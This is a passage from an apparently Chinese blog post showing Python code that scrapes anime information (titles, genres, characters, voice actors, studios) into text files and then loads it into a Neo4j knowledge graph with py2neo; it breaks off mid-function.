url_list:</span><br><span class="line">            url_html = self.get_base_html(url)</span><br><span class="line"></span><br><span class="line">            name = re.findall(<span class="string">&#x27;&lt;div class=&quot;ts18 bold&quot;&gt; (.*?) /&#x27;</span>, <span class="built_in">str</span>(url_html))</span><br><span class="line">            classify = re.findall(<span class="string">&#x27;&lt;div class=&quot;rw_ju&quot;&gt; &lt;span class=&quot;bold&quot;&gt;类型：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            role_name = re.findall(<span class="string">&#x27;title=&quot;(.*?)&quot; alt=&quot;&#x27;</span>,url_html)</span><br><span class="line">            role_img = re.findall(<span class="string">&#x27;&lt;img src=&quot;(.*?)&quot; title=&quot;&#x27;</span>,url_html)</span><br><span class="line">            name_img = re.findall(<span class="string">&#x27;&lt;img src=&quot;(.*?)&quot; alt=&quot;&#x27;</span>,url_html)</span><br><span class="line">            seiyuu = re.findall(<span class="string">&#x27;&lt;div class=&quot;rw_ju&quot;&gt; &lt;span class=&quot;bold&quot;&gt;人物配音：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            author = re.findall(<span class="string">&#x27;&lt;dd class=&quot;canshu value&quot;&gt;(.*?)&lt;/dd&gt;&#x27;</span>,url_html)</span><br><span class="line">            role_content = re.findall(<span class="string">&#x27;：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            content = []</span><br><span class="line"></span><br><span class="line">            soup = BeautifulSoup(url_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            div = soup.find(<span class="string">&quot;div&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;juqing&quot;</span>&#125;)</span><br><span class="line">            p = div.findChildren(<span class="string">&quot;p&quot;</span>, &#123;<span class="string">&quot;style&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,recursive=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">                p[i] = re.sub(<span class="string">&#x27;&lt;strong&gt;(.*?)&lt;/strong&gt;&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="built_in">str</span>(p[i]))</span><br><span class="line">                content.append(<span class="built_in">str</span>(p[i]).replace(<span class="string">&quot;\u3000&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>)[<span class="number">3</span>:-<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name)):</span><br><span class="line">                role_name[i] = <span class="built_in">str</span>(role_name[i]).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_content)):</span><br><span class="line">                role_content[i] = <span class="built_in">str</span>(role_content[i]).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">del</span> role_content[<span class="number">0</span>: <span class="number">7</span>]</span><br><span class="line">            time = role_content[<span class="number">0</span>]</span><br><span class="line">            role_content.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            name_list.append(name[<span class="number">0</span>])</span><br><span class="line">            role_img_list.append(role_img[<span class="number">1</span>:])</span><br><span class="line">            role_name_list.append(role_name)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">len</span>(author)&lt;<span class="number">4</span>):</span><br><span class="line">                author=[<span class="string">&quot;无&quot;</span>,<span class="string">&quot;无&quot;</span>,<span class="string">&quot;无&quot;</span>,<span class="string">&quot;无&quot;</span>]</span><br><span class="line">            author_list.append(author[<span class="number">2</span>])</span><br><span class="line">            platform_list.append(author[<span class="number">3</span>])</span><br><span class="line">            seiyuu_list.append(seiyuu)</span><br><span class="line">            content_list.append(content)</span><br><span class="line">            name_img_list.append(name_img[<span class="number">0</span>])</span><br><span class="line">            role_content_list.append(role_content)</span><br><span class="line">            time_list.append(time)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(classify) != <span class="number">0</span>):</span><br><span class="line">                classify_list.append(classify[<span class="number">0</span>].split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">#for i in list(zip(name_list,author_list,platform_list,classify_list,seiyuu_list,role_name_list,role_img_list)):</span></span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            self.name_file.write(<span class="built_in">str</span>(name_list[i].replace(<span class="string">&#x27;《&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;》&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.author_file.write(<span class="built_in">str</span>(author_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.platform_file.write(<span class="built_in">str</span>(platform_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.classify_file.write(<span class="built_in">str</span>(classify_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.seiyuu_file.write(<span class="built_in">str</span>(seiyuu_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_name_file.write(<span class="built_in">str</span>(role_name_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_img_file.write(<span class="built_in">str</span>(role_img_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.content_file.write(<span class="built_in">str</span>(content_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.name_img_file.write(<span class="built_in">str</span>(name_img_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.time_file.write(<span class="built_in">str</span>(time_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_content_file.write(<span class="built_in">str</span>(role_content_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_img.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.platform_file = <span class="built_in">open</span>(<span class="string">&#x27;data/platform.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.seiyuu_file = <span class="built_in">open</span>(<span class="string">&#x27;data/seiyuu.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/content.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.name_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name_img.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.role_content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_content.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.time_file = <span class="built_in">open</span>(<span class="string">&#x27;data/time.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">57</span>):</span><br><span class="line">            self.base_url = self.target_url + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;.html&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now is: &quot;</span> + self.base_url)</span><br><span class="line">            self.create_list()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = requests.get(self.target_url, headers)</span><br><span class="line">        <span class="built_in">print</span>(res.encoding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    cra.run()</span><br></pre></td></tr></table></figure>
<p>知识图谱：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph,Node,Relationship</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">classification = [<span class="string">&#x27;番剧名称&#x27;</span>,<span class="string">&#x27;番剧类型&#x27;</span>,<span class="string">&#x27;角色列表&#x27;</span>,<span class="string">&#x27;声优列表&#x27;</span>,<span class="string">&#x27;播放平台&#x27;</span>,<span class="string">&#x27;制作公司&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KG</span>:</span></span><br><span class="line">    name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    name_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name_img.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    time_file = <span class="built_in">open</span>(<span class="string">&#x27;data/time.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    platform_file = <span class="built_in">open</span>(<span class="string">&#x27;data/platform.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_img.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_content.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    seiyuu_file = <span class="built_in">open</span>(<span class="string">&#x27;data/seiyuu.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/content.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createEntity</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        cql = <span class="string">&#x27;&#x27;&#x27;CREATE (n:番剧数据库&#123;id:&#x27;0&#x27;, name:&#x27;番剧数据库&#x27;&#125;) RETURN n&#x27;&#x27;&#x27;</span></span><br><span class="line">        graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(classification):</span><br><span class="line">            cql = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                MERGE (a:番剧数据库&#123;id:&#x27;%d&#x27;, name:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b &#123;name: &#x27;番剧数据库&#x27;&#125;) </span></span><br><span class="line"><span class="string">                MERGE (b)-[:划分]-&gt;(a)</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span> % (i+<span class="number">1</span>, c)</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        name_img_list = self.name_img_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        platform_list = self.platform_file.readlines()</span><br><span class="line">        content_list = self.content_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MERGE (:番剧名称&#123;id:&#x27;%d&#x27;,名称:&quot;%s&quot;,图片:&#x27;%s&#x27;,内容:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i, name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       name_img_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       content_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 1 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        author_tmp_list = []</span><br><span class="line">        platform_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            <span class="keyword">if</span> author_list[i] <span class="keyword">not</span> <span class="keyword">in</span> author_tmp_list:</span><br><span class="line">                author_tmp_list.append(author_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:制作公司&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line">            <span class="keyword">if</span> platform_list[i] <span class="keyword">not</span> <span class="keyword">in</span> platform_tmp_list:</span><br><span class="line">                platform_tmp_list.append(platform_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:播放平台&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, platform_list[i].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 2 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        classify_tmp_list = []</span><br><span class="line">        seiyuu_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            seiyuu_list = self.seiyuu_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_name_list = self.role_name_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_img_list = self.role_img_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_content_list = self.role_content_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)):</span><br><span class="line">                <span class="keyword">if</span> classify_list[j] <span class="keyword">not</span> <span class="keyword">in</span> classify_tmp_list:</span><br><span class="line">                    classify_tmp_list.append(classify_list[j])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:番剧类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (classify_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seiyuu_list)):</span><br><span class="line">                <span class="keyword">if</span> seiyuu_list[j] <span class="keyword">not</span> <span class="keyword">in</span> seiyuu_tmp_list:</span><br><span class="line">                    seiyuu_tmp_list.append(seiyuu_list[j])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:声优列表&#123;名称:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (seiyuu_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name_list)):</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">len</span>(role_name_list)!=<span class="built_in">len</span>(role_img_list)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;wrong img:&quot;</span>+role_name_list[j])</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">len</span>(role_content_list)&lt;<span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;,性别:&#x27;%s&#x27;,身份:&#x27;%s&#x27;,特征:&#x27;%s&#x27;,配音:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_content_list[j * <span class="number">4</span> + <span class="number">0</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_content_list[j * <span class="number">4</span> + <span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_content_list[j * <span class="number">4</span> + <span class="number">2</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_content_list[j * <span class="number">4</span> + <span class="number">3</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 3 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createreRationship</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        self.name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.seiyuu_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.platform_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.role_name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.role_img_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.author_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.classify_file.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        platform_list = self.platform_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_name_list = self.role_name_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_img_list = self.role_img_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            seiyuu_list = self.seiyuu_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)-<span class="number">1</span>):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:番剧类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:类型]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       classify_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name_list)):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:属于]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       